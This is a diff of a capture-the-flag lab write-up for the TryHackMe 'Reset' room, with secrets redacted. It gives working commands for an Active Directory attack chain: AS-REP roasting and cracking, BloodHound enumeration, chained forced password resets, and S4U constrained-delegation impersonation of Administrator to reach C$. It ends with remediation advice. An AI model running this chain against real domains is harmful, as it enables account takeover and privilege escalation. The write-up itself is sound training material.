@@ -10,7 +10,7 @@ mermaid: true
 
 > **Room:** [TryHackMe — Reset](https://tryhackme.com/room/resetui)  
 > **Difficulty:** Hard · **Completed:** 30 October 2026 · **Author:** Kossi Richard Allado (allakori)  
-> **Lab domain:** \`thm.corp\` · **Host:** \`HAYSTACK\` / \`haystack.thm.corp\` · **Lab IP during my session:** \`10.128.171.57\`  
+> **Lab domain:** `thm.corp` · **Host:** `HAYSTACK` / `haystack.thm.corp` · **Lab IP during my session:** `10.128.171.57`  
 > **Sensitive values:** Passwords, cracked hashes and flag contents are **not published**.
 
 ## 0. Introduction: what this write-up documents
@@ -19,7 +19,7 @@ On **30 October 2026**, I completed **Reset**, an Active Directory challenge mar
 
 This is my technical reconstruction from the commands and outputs I retained during that session, not a claim that I have a perfect unbroken terminal recording. I have therefore marked three kinds of evidence throughout:
 
-- **Recorded:** I preserved the actual command or its output from my session. Where a command originally contained a password, only that argument is replaced with a variable or \`[REDACTED]\`.
+- **Recorded:** I preserved the actual command or its output from my session. Where a command originally contained a password, only that argument is replaced with a variable or `[REDACTED]`.
 - **Reconstructed command:** Equivalent syntax for an operation I performed, but not a verbatim command I can prove I typed.
 - **Observed outcome:** My retained output establishes that the step worked; any omitted intermediate activity is called out explicitly.
 
@@ -29,7 +29,7 @@ This distinction matters. A useful pentest report should help readers understand
 
 Here is the actual progression I documented, with no secrets exposed:
 
-\`\`\`mermaid
+```mermaid
 flowchart TD
     A["HAYSTACK / THM.CORP<br/>Windows & AD enumeration"] --> B["Anonymous SMB access<br/>Data/onboarding documents"]
     B --> C["Domain identity discovery<br/>AS-REP Roasting"]
@@ -40,7 +40,7 @@ flowchart TD
     G --> H["DARLA_WINTERS<br/>Kerberos constrained delegation"]
     H --> I["S4U2Self / S4U2Proxy<br/>Administrator CIFS service ticket"]
     I --> J["Kerberos SMB access to C$<br/>Both room objectives verified"]
-\`\`\`
+```
 
 **Important nuance:** My preserved initial SMB-document evidence does not demonstrate every step by which I derived the AS-REP target list. I do **not** present a third-party foothold technique as my own when I do not have its original terminal evidence.
 
@@ -67,11 +67,11 @@ The host identified itself as **HAYSTACK** in the **THM.CORP** domain. The envir
 
 The *specific full original scan invocation* was not preserved; the following reproduces the relevant discovery approach:
 
-\`\`\`bash
+```bash
 # Reconstructed equivalent — the IP is from my session, not a permanent room IP.
 nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 \
   10.128.171.57
-\`\`\`
+```
 
 **Takeaway:** An open port is a lead, not a vulnerability. For this machine, SMB, Kerberos and LDAP were more useful investigative starting points than treating every service as independently exploitable.
 
@@ -79,16 +79,16 @@ nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 \
 
 My recorded command to interact with the **Data** share did **not** require a domain password:
 
-\`\`\`bash
+```bash
 # Recorded in the October 30 session:
 smbclient //10.128.171.57/data -N
-\`\`\`
+```
 
-The accessible content included an \`onboarding\` directory. My session recorded a PDF with a randomized-looking filename:
+The accessible content included an `onboarding` directory. My session recorded a PDF with a randomized-looking filename:
 
-\`\`\`text
+```text
 x5oa55w5.0vj.pdf    3032659 bytes
-\`\`\`
+```
 
 The file was an onboarding message associated with the user **LILY_ONEILL**. Its text contained a reset/initial-password instruction.
 
@@ -98,13 +98,13 @@ I intentionally do **not** reproduce that password. The important weakness was n
 
 I used SMB file retrieval and text extraction. The *exact original download sequence* was not retained; the following is equivalent syntax for **reading a downloaded PDF**, not an invented screenshot of my terminal:
 
-\`\`\`bash
+```bash
 # After downloading an authorized test document:
 pdftotext -layout x5oa55w5.0vj.pdf -
-\`\`\`
+```
 
 **Observed:** SMB share access and the onboarding PDF.  
-**Not independently preserved:** The exact contents of my initial SMB \`get\` command and a complete transcript linking that document to all later credentials.
+**Not independently preserved:** The exact contents of my initial SMB `get` command and a complete transcript linking that document to all later credentials.
 
 **Why it matters:** Anonymous or overly broad share permissions are especially dangerous when scripts, onboarding templates and operational documents contain authentication details. A professional audit needs to record *who could read what*, not simply list share names.
 
@@ -120,14 +120,14 @@ This does not itself confer administrator privileges: the real impact depends on
 
 My retained session contains the successful cracking operation, but does **not** preserve the exact command that originally requested the AS-REP data. Here is the equivalent Impacket syntax, clearly labeled **reconstructed**:
 
-\`\`\`bash
+```bash
 # Reconstructed equivalent, not claimed as a verbatim historical command.
 # users.txt is a candidate username list from an authorized domain lab.
 impacket-GetNPUsers 'thm.corp/' \
   -usersfile users.txt -no-pass -request \
   -format john -outputfile asrep.hashes \
   -dc-ip 10.128.171.57
-\`\`\`
+```
 
 The format and filename are important: John the Ripper needs correctly formatted AS-REP material, and a saved file makes the offline step repeatable.
 
@@ -135,30 +135,30 @@ The format and filename are important: John the Ripper needs correctly formatted
 
 The actual John command from my October terminal history was:
 
-\`\`\`bash
+```bash
 john --format=krb5asrep \
   --wordlist=/usr/share/wordlists/rockyou.txt \
   asrep.hashes
-\`\`\`
+```
 
 **Recorded result, sanitized:**
 
-\`\`\`text
+```text
 [REDACTED PASSWORD]  ($krb5asrep$23$TABATHA_BRITT@THM.CORP)
-\`\`\`
+```
 
 This means a password was recovered for **TABATHA_BRITT**, not that a privileged shell had already been obtained. The hash and password bytes are intentionally withheld.
 
 ### Validate the identity using NetExec
 
-The original successful SMB validation command used \`nxc smb\` with **TABATHA_BRITT**. Below the password is supplied interactively rather than copied from the original command line:
+The original successful SMB validation command used `nxc smb` with **TABATHA_BRITT**. Below the password is supplied interactively rather than copied from the original command line:
 
-\`\`\`bash
+```bash
 read -rsp 'TABATHA_BRITT password: ' TABATHA_PASS; echo
 
 nxc smb 10.128.171.57 \
   -u TABATHA_BRITT -p "$TABATHA_PASS" -d thm.corp
-\`\`\`
+```
 
 **Observed result:** SMB authentication succeeded. A separate WinRM attempt with the same account **failed to establish an interactive shell**.
 
@@ -178,28 +178,28 @@ With an authenticated domain identity, I collected Active Directory relationship
 
 This is the original tool/argument structure from my session; only the inline password is replaced with the shell variable already defined above:
 
-\`\`\`bash
+```bash
 bloodhound-python \
   -u TABATHA_BRITT -p "$TABATHA_PASS" \
   -d thm.corp -ns 10.128.171.57 -c all
-\`\`\`
+```
 
 The **recorded collection output** reported:
 
-\`\`\`text
+```text
 Found 42 users
 Found 55 groups
 Found 3 gpos
 Found 222 ous
 Found 19 containers
 Found 0 trusts
-\`\`\`
+```
 
 These counts describe collected directory objects; they are **not** counts of vulnerabilities or compromised accounts.
 
 BloodHound's real value is in relations between **principals**, **objects**, and **effective permissions**. The path I identified was:
 
-\`\`\`text
+```text
 TABATHA_BRITT
     |
     | GenericAll
@@ -217,7 +217,7 @@ DARLA_WINTERS
     | Kerberos constrained delegation
     v
 CIFS service on haystack.thm.corp
-\`\`\`
+```
 
 ### Why these edges matter
 
@@ -231,48 +231,48 @@ The key mistake would be to treat every BloodHound edge as automatically exploit
 
 ## 5. Chaining password-reset rights
 
-My October terminal session contained three successful password-reset operations using Samba's \`net rpc password\` command:
+My October terminal session contained three successful password-reset operations using Samba's `net rpc password` command:
 
-1. **TABATHA_BRITT → SHAWNA_BRAY**, enabled by \`GenericAll\`.
-2. **SHAWNA_BRAY → CRUZ_HALL**, using \`ForceChangePassword\`.
-3. **CRUZ_HALL → DARLA_WINTERS**, using \`ForceChangePassword\`.
+1. **TABATHA_BRITT → SHAWNA_BRAY**, enabled by `GenericAll`.
+2. **SHAWNA_BRAY → CRUZ_HALL**, using `ForceChangePassword`.
+3. **CRUZ_HALL → DARLA_WINTERS**, using `ForceChangePassword`.
 
 Below are the **same operation patterns**, with passwords replaced by variables. The actual commands I ran used inline secrets; I do not republish them.
 
 ### 5.1 TABATHA_BRITT controls SHAWNA_BRAY
 
-\`\`\`bash
+```bash
 # Prompt for a password without exposing it in this write-up.
 read -rsp 'New lab password for SHAWNA_BRAY: ' SHAWNA_PASS; echo
 
 net rpc password 'SHAWNA_BRAY' "$SHAWNA_PASS" \
   -U "THM.CORP/TABATHA_BRITT%$TABATHA_PASS" \
   -S haystack.thm.corp
-\`\`\`
+```
 
 **Expected behavior and observed outcome:** The command succeeded in my session; the newly controlled identity could then be used in authenticated tests.
 
 ### 5.2 SHAWNA_BRAY controls CRUZ_HALL
 
-\`\`\`bash
+```bash
 read -rsp 'New lab password for CRUZ_HALL: ' CRUZ_PASS; echo
 
 net rpc password 'CRUZ_HALL' "$CRUZ_PASS" \
   -U "THM.CORP/SHAWNA_BRAY%$SHAWNA_PASS" \
   -S haystack.thm.corp
-\`\`\`
+```
 
 **Observed outcome:** The operation worked, and later credentials for **CRUZ_HALL** were successfully validated.
 
 ### 5.3 CRUZ_HALL controls DARLA_WINTERS
 
-\`\`\`bash
+```bash
 read -rsp 'New lab password for DARLA_WINTERS: ' DARLA_PASS; echo
 
 net rpc password 'DARLA_WINTERS' "$DARLA_PASS" \
   -U "THM.CORP/CRUZ_HALL%$CRUZ_PASS" \
   -S haystack.thm.corp
-\`\`\`
+```
 
 **Observed outcome:** This gave me control of the identity **DARLA_WINTERS**, the key account for the next phase.
 
@@ -302,23 +302,23 @@ This matters because **a service ticket is not the user's password**. The ticket
 
 This command was **executed in my session**. Only the password argument is substituted:
 
-\`\`\`bash
+```bash
 impacket-getST \
   -spn 'cifs/haystack.thm.corp' \
   -impersonate Administrator \
   -dc-ip 10.128.171.57 \
   "thm.corp/DARLA_WINTERS:$DARLA_PASS"
-\`\`\`
+```
 
 **The actual command output included the following lines:**
 
-\`\`\`text
+```text
 [*] Getting TGT for user
 [*] Impersonating Administrator
 [*] Requesting S4U2self
 [*] Requesting S4U2Proxy
 [*] Saving ticket in Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
-\`\`\`
+```
 
 These are the decisive facts:
 
@@ -335,26 +335,26 @@ These are the decisive facts:
 
 This exact export command was recorded in my terminal:
 
-\`\`\`bash
+```bash
 export KRB5CCNAME="$PWD/Administrator@cifs_haystack.thm.corp@THM.CORP.ccache"
-\`\`\`
+```
 
-\`KRB5CCNAME\` tells Kerberos-aware clients which cache to consult. It is easy to confuse a valid ticket with a usable ticket: a wrong cache path, host name or SPN can make the final command fail even if ticket issuance succeeded.
+`KRB5CCNAME` tells Kerberos-aware clients which cache to consult. It is easy to confuse a valid ticket with a usable ticket: a wrong cache path, host name or SPN can make the final command fail even if ticket issuance succeeded.
 
 ### 7.2 Connect with Impacket SMBClient
 
 The next command is **verbatim from my successful session**:
 
-\`\`\`bash
+```bash
 impacket-smbclient -k -no-pass -target-ip 10.128.171.57 \
   'thm.corp/Administrator@haystack.thm.corp'
-\`\`\`
+```
 
 Why these options?
 
-- \`-k\`: use Kerberos authentication.
-- \`-no-pass\`: do not prompt for or supply an account password; rely on existing Kerberos material.
-- \`-target-ip\`: specify the lab IP while preserving the DNS/SPN host name in the target identity.
+- `-k`: use Kerberos authentication.
+- `-no-pass`: do not prompt for or supply an account password; rely on existing Kerberos material.
+- `-target-ip`: specify the lab IP while preserving the DNS/SPN host name in the target identity.
 
 A successful SMB connection demonstrates that the **CIFS service accepted the ticket**. It should not be described as a full Administrator interactive shell or as knowledge of the Administrator password.
 
@@ -362,23 +362,23 @@ A successful SMB connection demonstrates that the **CIFS service accepted the ti
 
 My retained interaction then navigated through the SMB client:
 
-\`\`\`text
+```text
 shares
 use C$
 cd Users
 cd Administrator
 cd Desktop
 cat root.txt
-\`\`\`
+```
 
 **Observed:** The room's root objective was present in the Administrator Desktop location and was successfully retrieved.
 
-I also reached the \`automate\` user profile and verified \`user.txt\`. **Neither value is included here.**
+I also reached the `automate` user profile and verified `user.txt`. **Neither value is included here.**
 
-\`\`\`text
+```text
 Objective 1: user.txt — VERIFIED (contents withheld)
 Objective 2: root.txt — VERIFIED (contents withheld)
-\`\`\`
+```
 
 This gave me a concrete, validated result beyond graph analysis or ticket issuance: the delegated authentication path provided access to a sensitive administrative file share.
 
@@ -390,7 +390,7 @@ The point of a write-up is not simply that a series of commands worked. It shoul
 | --- | --- | --- |
 | Excessive exposure of onboarding material | Shared files reachable outside the intended user population | Credentials or operational details may leak |
 | AS-REP Roastable account with a weak password | Kerberos pre-authentication exception and inadequate password strength | Offline password recovery against a domain identity |
-| Overly permissive AD object ACLs | Excessive \`GenericAll\` and delegated password-reset authority | Transitive control of additional identities |
+| Overly permissive AD object ACLs | Excessive `GenericAll` and delegated password-reset authority | Transitive control of additional identities |
 | Sensitive constrained delegation | Delegation permissions assigned to an account reachable through the ACL chain | Service-ticket impersonation to sensitive service access |
 
 These findings reinforce a central lesson: **security impact is compositional**. A single weak password might not provide remote shell access. Several rights that appear unimportant on their own can combine into a much more serious path.
@@ -401,7 +401,7 @@ These findings reinforce a central lesson: **security impact is compositional**.
 
 1. Remove initial credentials and other secrets from broadly accessible onboarding material; review SMB ACLs and guest/anonymous access.
 2. Require Kerberos pre-authentication for normal user accounts and review exceptions; improve password quality.
-3. Audit AD ACL assignments, especially \`GenericAll\`, \`GenericWrite\`, \`WriteDACL\` and \`ForceChangePassword\` on sensitive objects.
+3. Audit AD ACL assignments, especially `GenericAll`, `GenericWrite`, `WriteDACL` and `ForceChangePassword` on sensitive objects.
 4. Reduce transitive administrative rights: investigate **who can reset an account that itself controls another privileged identity**.
 5. Restrict Kerberos delegation to the minimum required SPNs and protect service accounts from unnecessary object-control permissions.
 6. Review sensitive share permissions and service-account access, and retest each control after modification.
@@ -442,13 +442,13 @@ In a client-facing report, I would separate **the evidence, the root cause and t
 | Anonymous SMB and onboarding PDF | **Recorded** |
 | Full original SMB download command | **Not preserved; equivalent shown** |
 | Original AS-REP request command | **Not preserved; equivalent shown** |
-| John crack of \`TABATHA_BRITT\` | **Recorded** |
+| John crack of `TABATHA_BRITT` | **Recorded** |
 | NetExec authentication; WinRM failure | **Recorded** |
 | BloodHound collection and object counts | **Recorded** |
 | Permission relationships | **Recorded** |
-| Three \`net rpc password\` operations | **Recorded; credentials redacted** |
-| \`impacket-getST\` S4U request and output | **Recorded; credential redacted** |
-| \`KRB5CCNAME\` and Kerberos SMB client | **Recorded verbatim** |
+| Three `net rpc password` operations | **Recorded; credentials redacted** |
+| `impacket-getST` S4U request and output | **Recorded; credential redacted** |
+| `KRB5CCNAME` and Kerberos SMB client | **Recorded verbatim** |
 | Both room objectives | **Verified; flag values withheld** |
 
 ## 11. Conclusion
